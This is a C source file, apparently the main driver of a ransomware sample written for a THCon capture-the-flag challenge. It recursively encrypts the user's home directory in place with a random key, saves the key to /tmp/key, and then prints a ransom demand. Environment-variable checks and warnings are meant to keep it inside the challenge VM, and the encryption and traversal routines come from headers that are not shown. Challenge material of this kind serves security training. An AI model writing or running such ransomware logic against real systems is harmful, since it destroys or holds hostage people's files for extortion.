#include <stdio.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>
#include <errno.h>
#include "crypto.h"
#include "explorer.h"

#define DEFAULT_KEY_PATH "/tmp/key"
#define PATH_LENGTH 256

void help_text(char *name)
{
    printf("Usage: %s -e | --encrypt | -d | --decrypt [keyfile]\n", name);
    printf("This software should not be used outside of the THCon challenge.\n");
    printf("The Toulouse Hacking Convention is not responsible for the use of this software.\n");
}

void safety_check()
{
    /* Safeguards. */
    char *safety_1 = getenv("CPTLCK_SFTY_1");
    char *safety_2 = getenv("CPTLCK_SFTY_2");

    /* Safety check (environment variables). */
    if (safety_1 == NULL || (strcmp(safety_1, "ENCRYPT") != 0) || safety_2 == NULL || (strcmp(safety_2, "DANGER") != 0))
    {
        fprintf(stderr, "Please DON'T launch this program outside of the THCon challenge VM!\n");
        fprintf(stderr, "Neither the authors nor the THCon should be held responsible for any damage resulting of the use of this program.\n");
        abort();
    }
}

int cmdline_parse(int argc, char *argv[], enum action *action, char *keyfile)
{
    /* Parse command line. */
    if (argc > 1)
    {
        /* Wrong number of argument. */
        if (argc > 3)
        {
            help_text(argv[0]);
            return -1;
        }

        /* Parse arguments. */
        if ((strcmp(argv[1], "--encrypt") == 0) || (strcmp(argv[1], "-e") == 0))
        {
            /* Encrypt target folder using a random key. */
            *action = ENCRYPT;
            if (argc == 3) strncpy(keyfile, argv[2], PATH_LENGTH);
            else strncpy(keyfile, DEFAULT_KEY_PATH, PATH_LENGTH);
            keyfile[PATH_LENGTH-1] = '\0';
        }
        else if ((strcmp(argv[1], "--decrypt") == 0) || (strcmp(argv[1], "-d") == 0))
        {
            /* Decrypt target folder using key from stdin. */
            *action = DECRYPT;
            if (argc == 3) strncpy(keyfile, argv[2], PATH_LENGTH);
            else strncpy(keyfile, DEFAULT_KEY_PATH, PATH_LENGTH);
            keyfile[PATH_LENGTH-1] = '\0';
        }
        else if ((argc == 2) && ((strcmp(argv[1], "--help") == 0) || (strcmp(argv[1], "-h") == 0)))
        {
            /* Display help text. */
            help_text(argv[0]);
            return 0;
        }
        else
        {
            /* Bad argument. */
            help_text(argv[0]);
            return -2;
        }
    }
    else
    {
        help_text(argv[0]);
        return 0;
    }

    return 1;
}

/* Initialise the key depending on the target action.
 * key must be an allocated buffer of size KEY_SIZE. */
void initialise_key(enum action action, char *keyfile, unsigned char *key)
{
    int key_fd;
    switch (action)
    {
        case ENCRYPT:
            /* Generate a random 256 bit key. */
            if (!get_random_bytes(key, KEY_SIZE)) handleErrors();
            key_fd = open(keyfile, O_WRONLY | O_CREAT | O_EXCL, S_IRUSR | S_IWUSR);
            if (key_fd < 0)
            {
                perror("[Encryption] Error opening key file");
                abort();
            }
            if (write(key_fd, key, KEY_SIZE) != KEY_SIZE)
            {
                perror("[Encryption] Error writing key to key file");
                abort();
            }
            close(key_fd);
            break;

        case DECRYPT:
            key_fd = open(keyfile, O_RDONLY);
            if (key_fd < 0)
            {
                perror("[Decryption] Error opening key file");
                abort();
            }
            if (read(key_fd, key, KEY_SIZE) != KEY_SIZE)
            {
                perror("[Decryption] Error reading key from key file");
                abort();
            }
            close(key_fd);
            break;

        default:
            fprintf(stderr, "Undefined behaviour in initialise_key!\n");
            abort();
            break;
    };
}

/*
 * Main:
 * * Check the different safeguards before doing anything.
 * * Generate a random key.
 * * Send the key somewhere (before encrypting).
 * * Recursively lock / unlock a folder in place.
 * */
int main(int argc, char *argv[])
{
    /* Target folder path & descriptor. */
    char *target_folder;
    int target_fd;

    /* A 256 bit key. */
    unsigned char *key;

    /* Path to keyfile. */
    char *keyfile;

    /* Action to perform. */
    enum action action;

    target_folder = getenv("HOME");
    printf("Target folder: %s\n", target_folder);

    keyfile = (char *) malloc(PATH_LENGTH*sizeof(char));

    int res;
    if ((res = cmdline_parse(argc, argv, &action, keyfile)) <= 0) exit(-res);

    safety_check();

    initialise_openssl();

    key = (unsigned char *) malloc(KEY_SIZE*sizeof(unsigned char));
    initialise_key(action, keyfile, key);

    /* Lock (encrypt in place) the target folder. */
    target_fd = open(target_folder, O_RDONLY | O_DIRECTORY);
    handle_folder(key, action, target_fd);

    close_openssl();

    /* In case of encryption, keep the program running. */
    if (action == ENCRYPT)
    {
        printf("You have been powned, please pay in order to get your data back!\n");
        while (1)
        {
            sleep(2);
        }
    }

    free(key);

    return 0;
}
